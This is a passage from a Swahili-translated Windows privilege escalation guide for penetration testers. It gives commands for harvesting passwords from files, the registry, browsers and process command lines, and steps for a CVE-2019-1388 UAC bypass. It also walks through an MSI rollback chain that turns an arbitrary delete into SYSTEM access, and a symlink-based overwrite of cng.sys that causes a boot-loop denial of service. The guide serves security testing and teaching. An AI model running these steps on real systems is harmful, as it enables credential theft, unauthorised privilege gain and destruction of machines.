reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historia za vivinjari

Unapaswa kukagua dbs ambapo nywila za **Chrome or Firefox** zinahifadhiwa.\
Pia angalia historia, bookmarks na favourites za vivinjari kwa sababu labda baadhi ya **passwords are** stored there.

Vifaa vya kuchota passwords kutoka kwa vivinjari:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

Component Object Model (COM) ni teknolojia iliyojengwa ndani ya mfumo wa uendeshaji wa Windows inayoruhusu mawasiliano kati ya vipengele vya programu vilivyotengenezwa kwa lugha tofauti. Kila kipengele cha COM kinatambulika kwa class ID (CLSID) na kila kipengele kinaonyesha utendakazi kupitia moja au zaidi ya interface, zinazoelezwa kwa interface IDs (IIDs).

COM classes and interfaces are defined in the registry under **HKEY\CLASSES\ROOT\CLSID** and **HKEY\CLASSES\ROOT\Interface** respectively. This registry is created by merging the **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Ndani ya CLSIDs za rejista hii utaona rejista ndogo **InProcServer32** ambayo ina **default value** inayorejelea **DLL** na thamani inayoitwa **ThreadingModel** ambayo inaweza kuwa **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) au **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

Kwa msingi, ikiwa unaweza kuandika upya (overwrite) yoyote ya DLL ambazo zitatekelezwa, unaweza kupandisha ruhusa (escalate privileges) ikiwa DLL hiyo itatekelezwa na mtumiaji mwingine.

Ili kujifunza jinsi watakuli (attackers) wanavyotumia COM Hijacking kama mfumo wa kudumu (persistence mechanism) angalia:

{{#ref}}
com-hijacking.md
{{#endref}}

### **Utafutaji wa jumla wa Password katika faili na registry**

Tafuta yaliyomo ndani ya faili
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Tafuta faili yenye jina fulani**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Tafuta registry kwa key names na passwords**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Vifaa vinavyotafuta passwords

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **ni plugin ya msf** niliunda plugin hii ili **kufanya utekelezaji wa kiotomatiki wa kila metasploit POST module inayotafuta credentials** ndani ya mwathirika.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) inatafuta kiotomatiki faili zote zenye passwords zilizotajwa kwenye ukurasa huu.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) ni zana nyingine nzuri ya kuchota password kutoka kwa mfumo.

Zana [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) inatafuta **sessions**, **usernames** na **passwords** za zana mbalimbali ambazo zinahifadhi data hii katika clear text (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Fikiria kuwa **mchakato unaoendesha kama SYSTEM unafungua mchakato mpya** (`OpenProcess()`) wenye **ufikiaji kamili**. Mchakato huo huo **pia huunda mchakato mpya** (`CreateProcess()`) **uliokuwa na ruhusa za chini lakini ukirithi handles zote zilizofunguliwa za mchakato mkuu**.\
Kisha, ukipata **ufikiaji kamili kwa mchakato wenye ruhusa za chini**, unaweza kupata **handle iliyo wazi ya mchakato mwenye cheo iliyoundwa** kwa `OpenProcess()` na **kuingiza shellcode**.\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Fragments za shared memory, zinazoitwa **pipes**, zinawawezesha michakato kuwasiliana na kubadilishana data.

Windows inatoa kipengele kinachoitwa **Named Pipes**, kuruhusu michakato isiyohusiana kushiriki data, hata kwenye mitandao tofauti. Hii ni kama usanifu wa client/server, ambapo majukumu yameainishwa kama **named pipe server** na **named pipe client**.

Wakati data inapotumwa kupitia pipe na **client**, **server** iliyoweka pipe ina uwezo wa **kuchukua utambulisho** wa **client**, ikiwa inayo haki za **SeImpersonate** zinazohitajika. Kutambua **mchakato mwenye cheo** unaozungumza kupitia pipe unaweza kuiga kunatoa fursa ya **kupata ngazi kubwa za ruhusa** kwa kuchukua utambulisho wa mchakato huo mara tu unaposhirikiana na pipe uliyoanzisha. Kwa maelekezo ya jinsi ya kufanya shambulio kama hilo, mwongozo muhimu unaweza kupatikana [**hapa**](named-pipe-client-impersonation.md) na [**hapa**](#from-high-integrity-to-system).

Vilevile zifuatazo zana zinakuwezesha **kupiga intercept mawasiliano ya named pipe kwa zana kama burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **na zana hii inaruhusu kuorodhesha na kuona pipes zote kutafuta privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Telephony service (TapiSrv) katika mode ya server inafungua `\\pipe\\tapsrv` (MS-TRP). Mteja wa mbali aliyethibitishwa anaweza kutumia njia ya matukio ya async inayotegemea mailslot kubadilisha `ClientAttach` kuwa uandishi wa hiari wa **4-byte write** kwa faili yoyote iliyopo ambayo inaweza kuandikwa na `NETWORK SERVICE`, kisha kupata haki za admin za Telephony na kupakia DLL ya hiari kama service. Mtiririko kamili:

- `ClientAttach` with `pszDomainUser` set to a writable existing path → the service opens it via `CreateFileW(..., OPEN_EXISTING)` and uses it for async event writes.
- Each event writes the attacker-controlled `InitContext` from `Initialize` to that handle. Register a line app with `LRegisterRequestRecipient` (`Req_Func 61`), trigger `TRequestMakeCall` (`Req_Func 121`), fetch via `GetAsyncEvents` (`Req_Func 0`), then unregister/shutdown to repeat deterministic writes.
- Add yourself to `[TapiAdministrators]` in `C:\Windows\TAPI\tsec.ini`, reconnect, then call `GetUIDllName` with an arbitrary DLL path to execute `TSPI_providerUIIdentify` as `NETWORK SERVICE`.

More details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Mengine

### File Extensions that could execute stuff in Windows

Angalia ukurasa **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Viungo vinavyoweza kubonyezwa vya Markdown vinavyopelekwa kwa `ShellExecuteExW` vinaweza kuamsha handlers hatarishi za URI (`file:`, `ms-appinstaller:` au mzunguko wowote uliosajiliwa) na kutekeleza faili zilizo chini ya udhibiti wa attacker kama mtumiaji wa sasa. Angalia:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

Unapopata shell kama user, kunaweza kuwa na scheduled tasks au michakato mingine inayotekelezwa ambayo **inapitisha nywila kwenye command line**. Script iliyo hapa chini inakamata command lines za michakato kila sekunde mbili na ikalinganisha hali ya sasa na ile ya awali, ikitoa mabadiliko yoyote.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Stealing passwords from processes

## From Low Priv User to NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Ikiwa una upatikanaji wa interface ya grafiki (via console au RDP) na UAC imewezeshwa, katika baadhi ya toleo za Microsoft Windows inawezekana kuendesha terminal au mchakato mwingine wowote kama "NT\AUTHORITY SYSTEM" kutoka kwa mtumiaji asiye na mamlaka.

Hili linafanya iwezekane kupandisha viwango vya mamlaka na kuzunguka UAC kwa wakati mmoja kwa udhaifu uleule. Zaidi ya hayo, hakuna haja ya kusakinisha chochote na binary inayotumiwa wakati wa mchakato huo, imesainiwa na kutolewa na Microsoft.

Baadhi ya mifumo iliyokumbwa ni ifuatayo:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
To exploit this vulnerability, inahitajika kutekeleza hatua zifuatazo:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
Una mafaili yote na taarifa zinazohitajika kwenye ghala la GitHub lifuatalo:

https://github.com/jas502n/CVE-2019-1388

## Kutoka Administrator (Medium) hadi High Integrity Level / UAC Bypass

Soma hii ili **kujifunza kuhusu Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Kisha **soma hii ili ujifunze kuhusu UAC na UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Kutoka Arbitrary Folder Delete/Move/Rename hadi SYSTEM EoP

Mbinu iliyoelezwa [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) na kodii ya exploit [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Shambulio linahusisha kwa msingi kutumia vibaya kipengele cha rollback cha Windows Installer ili kubadilisha mafaili halali na mabaya wakati wa mchakato wa uninstall. Kwa hili mshambulizi anahitaji kuunda **malicious MSI installer** itakayotumika ku-hijack folder ya `C:\Config.Msi`, ambayo baadaye itatumika na Windows Installer kuhifadhi rollback files wakati wa uninstall ya vifurushi vingine vya MSI ambapo rollback files zingeweza kubadilishwa ili ziwe na payload hatarishi.

Mbinu kwa ufupi ni kama ifuatavyo:

1. Stage 1 – Kujiandaa kwa Hijack (acha `C:\Config.Msi` iwe tupu)

- Hatua 1: Sakinisha MSI
- Tengeneza `.msi` inayosakinisha faili isiyoharibu (mfano, `dummy.txt`) katika folda inayoweza kuandikwa (`TARGETDIR`).
- Alama installer kama **"UAC Compliant"**, ili **non-admin user** aweze kuendesha.
- Weka **handle** wazi kwa faili baada ya kusakinisha.

- Hatua 2: Anza Uninstall
- Uninstall `.msi` ile ile.
- Mchakato wa uninstall unaanza kuhama mafaili kwenda `C:\Config.Msi` na kuya-reameka kuwa mafaili `.rbf` (rollback backups).
- **Fuatilia handle ya faili iliyofunguliwa** kwa kutumia `GetFinalPathNameByHandle` ili kugundua wakati faili inakuwa `C:\Config.Msi\<random>.rbf`.

- Hatua 3: Custom Syncing
- `.msi` ina **custom uninstall action (`SyncOnRbfWritten`)** ambayo:
- Inatoa ishara wakati `.rbf` imeandikwa.
- Kisha **inasubiri** tukio jingine kabla ya kuendelea na uninstall.

- Hatua 4: Zuia Uondoshaji wa `.rbf`
- Unapopokea ishara, **fungua faili `.rbf`** bila `FILE_SHARE_DELETE` — hii **inazuia kufutwa kwake**.
- Kisha **tuma ishara kurudisha** ili uninstall iendelee.
- Windows Installer inashindwa kufuta `.rbf`, na kwa sababu haiwezi kufuta yaliyomo yote, **`C:\Config.Msi` haiondoiwi**.

- Hatua 5: Futa `.rbf` kwa mkono
- Wewe (mshambulizi) unafuta faili `.rbf` kwa mkono.
- Sasa **`C:\Config.Msi` iko tupu**, tayari kuibiwa.

> Katika hatua hii, **trigger the SYSTEM-level arbitrary folder delete vulnerability** ili kufuta `C:\Config.Msi`.

2. Stage 2 – Kubadilisha Rollback Scripts kuwa Malicious

- Hatua 6: Rekebisha tena `C:\Config.Msi` na Weak ACLs
- Unda tena folda ya `C:\Config.Msi` wewe mwenyewe.
- Weka **weak DACLs** (mfano, Everyone:F), na **weka handle wazi** na `WRITE_DAC`.

- Hatua 7: Endesha Sakinisho Lingine
- Sakinisha `.msi` tena, na:
- `TARGETDIR`: Eneo linaloweza kuandikwa.
- `ERROROUT`: Kigezo kinachosababisha kushindwa kwa lazima.
- Sakinisho hili litatumika kuchochea **rollback** tena, ambalo linasoma `.rbs` na `.rbf`.

- Hatua 8: Fuatilia kwa `.rbs`
- Tumia `ReadDirectoryChangesW` kufuatilia `C:\Config.Msi` hadi `.rbs` mpya itoke.
- Rekodi jina lake la faili.

- Hatua 9: Sync Kabla ya Rollback
- `.msi` ina **custom install action (`SyncBeforeRollback`)** ambayo:
- Inatoa ishara wakati `.rbs` imeundwa.
- Kisha **inasubiri** kabla ya kuendelea.

- Hatua 10: Rudia Kuweka Weak ACL
- Baada ya kupokea tukio la `.rbs created`:
- Windows Installer **inarudisha strong ACLs** kwenye `C:\Config.Msi`.
- Lakini kwa kuwa bado una handle yenye `WRITE_DAC`, unaweza **kurudisha weak ACLs** tena.

> ACLs zinatekelezwa **tu wakati handle imefunguliwa**, hivyo bado unaweza kuandika kwenye folda.

- Hatua 11: Weka `.rbs` na `.rbf` Feki
- Fanya overwrite ya faili `.rbs` na **fake rollback script** inayomwambia Windows:
- Irejeshe faili yako ya `.rbf` (malicious DLL) katika **eneo lenye mamlaka** (mfano, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Weke `.rbf` feki yako inayoacha **malicious SYSTEM-level payload DLL**.

- Hatua 12: Zindua Rollback
- Tuma ishara ya sync ili installer ianze tena.
- Custom action ya **type 19 (`ErrorOut`)** imewezeshwa kusababisha **kushindwa kwa kusudi** kwa install mahali panapotambulika.
- Hii inasababisha **rollback kuanza**.

- Hatua 13: SYSTEM Inasakinisha DLL Yako
- Windows Installer:
- Inasoma `.rbs` yako hatarishi.
- Inanakili DLL yako ya `.rbf` kwenye eneo lengwa.
- Sasa una **malicious DLL kwenye path inayotumiwa na SYSTEM**.

- Hatua ya Mwisho: Endesha Msimbo wa SYSTEM
- Endesha binary inayotegemewa na yenye **auto-elevated** (mfano, `osk.exe`) inayopakia DLL uliyohijack.
- **Boom**: Msimbo wako unatekelezwa **as SYSTEM**.


### Kutoka Arbitrary File Delete/Move/Rename hadi SYSTEM EoP

Mbinu kuu ya MSI rollback (ule uliotangulia) inadhani unaweza kufuta **entire folder** (mfano, `C:\Config.Msi`). Lakini vipi ikiwa uvujaji wako unaruhusu tu **arbitrary file deletion**?

Unaweza kutumia **NTFS internals**: kila folda ina alternate data stream fiche iitwayo:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Stream hii inahifadhi **metadata ya index** ya kabrasha.

Kwa hivyo, ikiwa **utaondoa stream ya `::$INDEX_ALLOCATION`** ya kabrasha, NTFS **itaondoa kabrasha lote** kutoka kwenye filesystem.

Unaweza kufanya hivyo kwa kutumia APIs za kawaida za kufuta faili kama:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Ingawa unaitisha API ya kufuta *file*, inafuta **folder yenyewe**.

### Kutoka Folder Contents Delete hadi SYSTEM EoP
Je, vipi ikiwa primitive yako haitakuwezesha kufuta arbitrary files/folders, lakini **inawezesha kufuta *contents* ya attacker-controlled folder**?

1. Hatua 1: Tengeneza bait folder na file
- Tengeneza: `C:\temp\folder1`
- Ndani yake: `C:\temp\folder1\file1.txt`

2. Hatua 2: Weka **oplock** kwenye `file1.txt`
- Oplock **inasitisha utekelezaji** wakati mchakato ulio na ruhusa za juu anapojaribu kufuta `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Hatua 3: Amsha mchakato wa SYSTEM (kwa mfano, `SilentCleanup`)
- Mchakato huu husaka folda (kwa mfano, `%TEMP%`) na kujaribu kufuta yaliyomo ndani yao.
- Wakati inafika `file1.txt`, the **oplock triggers** na inakabidhi udhibiti kwa callback yako.

4. Hatua 4: Ndani ya oplock callback – rudisha ufutaji

- Chaguo A: Hamisha `file1.txt` mahali pengine
- Hii inafanya `folder1` iwe tupu bila kuvunja oplock.
- Usifute `file1.txt` moja kwa moja — hilo lingeachilia oplock mapema.

- Chaguo B: Geuza `folder1` kuwa **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Chaguo C: Unda **symlink** katika `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Hii inalenga stream ya ndani ya NTFS inayohifadhi metadata ya kabrasha — kuifuta kwake kunaondoa kabrasha.

5. Hatua 5: Kuachilia oplock
- Mchakato wa SYSTEM unaendelea na unajaribu kufuta `file1.txt`.
- Lakini sasa, kutokana na junction + symlink, kwa kweli inafuta:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Matokeo**: `C:\Config.Msi` imefutwa na SYSTEM.

### Kutoka Arbitrary Folder Create hadi Permanent DoS

Tumia primitive inayokuruhusu **kuunda folda yoyote kama SYSTEM/admin** — hata kama **huwezi kuandika faili** au **kuweka ruhusa dhaifu**.

Unda **folda** (sio **faili**) yenye jina la **Windows driver muhimu**, mfano:
```
C:\Windows\System32\cng.sys
```
- Njia hii kawaida inalingana na `cng.sys` kernel-mode driver.
- Ikiwa **uta-unda mapema kama folda**, Windows itashindwa kupakia dereva halisi wakati wa boot.
- Kisha, Windows inajaribu kupakia `cng.sys` wakati wa boot.
- Inaona folda, **inashindwa kutatua dereva halisi**, na **inasababisha hitilafu (crash) au kusimamisha boot**.
- Hakuna **fallback**, na **hakuna urejeshaji** bila uingiliaji wa nje (kwa mfano, ukarabati wa boot au upatikanaji wa diski).

### From privileged log/backup paths + OM symlinks to arbitrary file overwrite / boot DoS

When a **privileged service** writes logs/exports to a path read from a **writable config**, redirect that path with **Object Manager symlinks + NTFS mount points** to turn the privileged write into an arbitrary overwrite (even **without** SeCreateSymbolicLinkPrivilege).

**Requirements**
- Config storing the target path is writable by the attacker (e.g., `%ProgramData%\...\.ini`).
- Ability to create a mount point to `\RPC Control` and an OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- A privileged operation that writes to that path (log, export, report).

**Example chain**
1. Read the config to recover the privileged log destination, e.g. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` in `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Redirect the path without admin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Subiri sehemu yenye ruhusa ya juu iandike logi (kwa mfano, admin anachochea "send test SMS"). Uandishi sasa unaingia katika `C:\Windows\System32\cng.sys`.
4. Chunguza lengo lililobadilishwa (hex/PE parser) ili kuthibitisha uharibifu; kuanzisha upya kunalazimisha Windows kupakia njia ya driver iliyodanganywa → **boot loop DoS**. Hii pia inaongezeka kwa faili yoyote iliyo na ulinzi ambayo huduma yenye ruhusa itafungua kwa kuandika.

> `cng.sys` kwa kawaida hupakiwa kutoka `C:\Windows\System32\drivers\cng.sys`, lakini ikiwa nakala ipo katika `C:\Windows\System32\cng.sys` inaweza kujaribiwa kwanza, ikifanya iwe sinki ya DoS ya kuaminika kwa data iliyoharibika.



## **Kutoka High Integrity hadi SYSTEM**

### **Huduma mpya**

Kama tayari unafanya kazi kwenye mchakato wa High Integrity, **njia hadi SYSTEM** inaweza kuwa rahisi kwa **kuunda na kuendesha huduma mpya**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Unapotengeneza service binary hakikisha ni service halali au kwamba binary inafanya hatua zinazohitajika haraka, kwani itauawa ndani ya sekunde 20 ikiwa si service halali.

### AlwaysInstallElevated

Kutoka kwenye mchakato wa High Integrity unaweza kujaribu **kuwezesha funguo za rejista za AlwaysInstallElevated** na **kufunga** reverse shell ukitumia wrapper _**.msi**_.\
[Taarifa zaidi kuhusu funguo za rejista zinazohusika na jinsi ya kusakinisha kifurushi cha _.msi_ hapa.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Unaweza** [**kupata msimbo hapa**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Iwapo una ruhusa za token hizo (huenda ukazipata ndani ya mchakato ambao tayari ni wa High Integrity), utaweza **kufungua karibu mchakato wowote** (sio protected processes) kwa kutumia ruhusa ya SeDebug, **kunakili token** ya mchakato, na kuunda **mchakato wowote kwa kutumia token hiyo**.\
Kwa kutumia teknik hii kawaida huchaguliwa mchakato wowote unaoendesha kama SYSTEM na ruhusa zote za token (_ndio, unaweza kupata mchakato za SYSTEM zisizo na ruhusa zote za token_).\
**Unaweza kupata** [**mfano wa msimbo unaotekeleza teknik iliyopendekezwa hapa**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Teknik hii inatumiwa na meterpreter kuongeza hadhi kwa kutumia `getsystem`. Teknik hii inahusisha **kuunda pipe kisha kuunda/kunyanyasa service ili kuandika kwenye pipe hiyo**. Kisha, **server** iliyounda pipe kwa kutumia ruhusa ya **`SeImpersonate`** itaweza **kuiga token** ya client wa pipe (service) na kupata ruhusa za SYSTEM.\
Ikiwa unataka [**kujifunza zaidi kuhusu name pipes soma hii**](#named-pipe-client-impersonation).\
Ikiwa unataka kusoma mfano wa [**jinsi ya kutoka high integrity hadi System ukitumia name pipes soma hii**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Ikiwa utafanikiwa **kuhijack dll** inayopakiwa na **process** inayotumika kama **SYSTEM**, utaweza kutekeleza code yoyote kwa ruhusa hizo. Kwa hiyo Dll Hijacking pia ni muhimu kwa aina hii ya kupandisha ruhusa, na zaidi, ni **rahisi zaidi kufikiwa kutoka mchakato wa High Integrity** kwani utakuwa na **write permissions** kwenye folda zinazotumika kupakia dlls.\
**Unaweza** [**kujifunza zaidi kuhusu Dll hijacking hapa**](dll-hijacking/index.html)**.**

### **Kutoka Administrator au Network Service hadi System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### Kutoka LOCAL SERVICE au NETWORK SERVICE hadi full privs

**Soma:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Msaada zaidi

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Zana muhimu

**Zana bora ya kutafuta Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Angalia misconfigurations na faili nyeti (**[**angalia hapa**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Imegunduliwa.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Angalia kwa misconfigurations zinazowezekana na ukusanye taarifa (**[**angalia hapa**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Angalia misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Hutoa taarifa za kikao zilizohifadhiwa za PuTTY, WinSCP, SuperPuTTY, FileZilla, na RDP. Tumia -Thorough kwa local.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Hutokeza credentials kutoka Credential Manager. Imegunduliwa.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Piga (spray) nywila zilizokusanywa kwenye domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh ni PowerShell ADIDNS/LLMNR/mDNS spoofer na zana ya man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Orodhesha kwa msingi ukaguzi wa privesc wa Windows**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~ -- Tafuta udhaifu za privesc zinazojulikana (IMEACHWA kwa Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Ukaguzi wa ndani **(Inahitaji haki za Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Tafuta udhaifu za privesc zinazojulikana (inahitaji kuundwa kwa kutumia VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Inaripoti host ikitafuta misconfigurations (ikiwa zaidi ni chombo cha kukusanya taarifa kuliko privesc) (inahitaji kuundwa) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Hutokeza credentials kutoka kwa programu nyingi (exe iliyo tayari katika github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Toleo la PowerUp kwa C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~ -- Angalia misconfiguration (executable precompiled katika github). Haipendekezwi. Haifanyi kazi vizuri katika Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Angalia misconfigurations zinazowezekana (exe kutoka python). Haipendekezwi. Haifanyi kazi vizuri katika Win10.**

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Zana iliyotengenezwa kwa msingi wa chapisho hiki (haiitaji accesschk ili ifanye kazi vizuri lakini inaweza kuitumia).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Husoma matokeo ya **systeminfo** na kupendekeza exploits zinazofanya kazi (python ya ndani)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Husoma matokeo ya **systeminfo** na kupendekeza exploits zinazofanya kazi (python ya ndani)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Unapaswa kujenga mradi ukitumia toleo sahihi la .NET ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Ili kuona toleo la .NET lililosakinishwa kwenye host la mwathirika unaweza kufanya:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Marejeo

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
